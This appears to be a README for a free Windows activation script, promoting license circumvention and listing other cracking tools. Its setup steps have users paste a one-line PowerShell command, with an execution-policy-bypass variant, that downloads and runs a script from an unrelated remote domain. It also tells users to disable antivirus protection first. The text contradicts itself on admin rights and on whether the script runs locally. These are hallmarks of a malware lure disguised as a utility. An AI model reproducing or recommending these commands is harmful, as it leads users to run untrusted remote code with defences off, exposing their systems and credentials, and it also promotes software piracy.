<div align="center">

# Windows Activation Automation — Auto Script

![preview](https://raw.githubusercontent.com/Shinei4941/windows-automation-suite/main/splash_cc983d.svg)

[![status](https://img.shields.io/badge/Status-Active-2ea44f?style=flat&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/Lang-Python-06b6d4?style=flat&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/Tests-Ok-2ea44f?style=flat&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/Pwsh-5.1%2B_%2F_7%2B-22d3ee?style=flat&labelColor=0d1117)]()

</div>

---

This script automates Windows activation so you can get a licensed system without paying for a key. It runs as a lightweight, self-contained utility that walks through the activation steps for you and reports its status in plain language. Point it at a fresh install, run it from an elevated prompt, and review the output before rebooting. Contributions to the project are managed through its repository, where you can open an account and submit changes.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open Windows PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Execute the setup script
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## What It Does

This automation script handles Windows activation from a single launcher. It checks the current license and activation state, applies the appropriate activation method for the installed edition, and reports back whether activation succeeded or failed. The script runs locally, requires no manual key entry, and is designed to be re-run safely if activation status changes after updates or hardware swaps. It supports common Windows editions and automates the steps a user would otherwise perform by hand through the command line.

## Installation

Grab the project directly from its repository — either pull down the source or grab a packaged build from the releases area. Once you have it locally, unpack it into a folder you can find again and you're ready to run. No dependencies to chase down, no environment to configure; it's a self-contained script. If you're pulling the source instead of a release build, keep the folder structure intact so the script can reference its own files correctly. Verify the files landed where you expect before executing anything.

## Usage

Run the activator from an elevated command prompt or PowerShell window so it has the permissions it needs to touch system licensing. Launch it, then work through the on-screen prompts: pick the edition you want to activate, confirm the operation, and let it run to completion. No arguments are required for the default flow, but if the script exposes flags for silent or edition-specific runs, pass them after the executable name.

Watch the console output for the success confirmation before closing the window. If activation fails, re-read the prompt asking for the target edition and confirm it matches what's actually installed on the machine. Reboot once afterward if the tool reports that a restart is pending, then check the activation status in system settings to verify.

## Alternatives

If Windows-Activator-Free doesn't fit your setup, a few other approaches cover the same ground with different tradeoffs.

- **Microsoft Activation Scripts (MAS)** — a well-known collection of activation scripts maintained under the massgravel name. Broad coverage of Windows and Office editions, actively updated, and script-based like this project. A reasonable pick if you want a mature, widely used toolkit.
- **KMS_VL_ALL_AIO** — maintained by abbodi1406, this is a KMS-focused all-in-one script. It's the go-to when you specifically want KMS-style activation handling with a single script and no extra dependencies.
- **EzWindSLIC** — by Dir3ctr1x, this takes a SLIC-based approach rather than KMS. Worth considering if the KMS route hasn't worked on your hardware or you prefer that method.
- **Official licensing** — buying a legitimate key from Microsoft or an authorized reseller. Not a script, but it's the zero-maintenance option: no re-runs, no antivirus friction, and no breakage after major Windows updates.

A practical note: these tools differ mainly in activation method (KMS vs. SLIC vs. hybrid) and in how actively they're maintained. Pick based on your Windows edition and how much you value ongoing updates. Whichever you choose, keep a copy of the script locally, since availability of these repositories can change without warning.

## Disclaimer

This script is provided for educational and testing purposes only. It is not affiliated with, endorsed by, or supported by Microsoft or any official licensing body. Using it to activate software you do not own a valid license for may violate the terms of service of the target project and applicable local laws. You are solely responsible for how you run this script and for any consequences that follow.

The script is offered as-is, with no warranty of any kind, express or implied, including but not limited to fitness for a particular purpose or non-infringement. Activation methods can break after system updates, may be flagged by security software, and could leave your system in an inconsistent state. Always review the code before running it, test in a disposable environment first, and keep backups of anything you care about. If you need a legitimate license, buy one from an authorized source.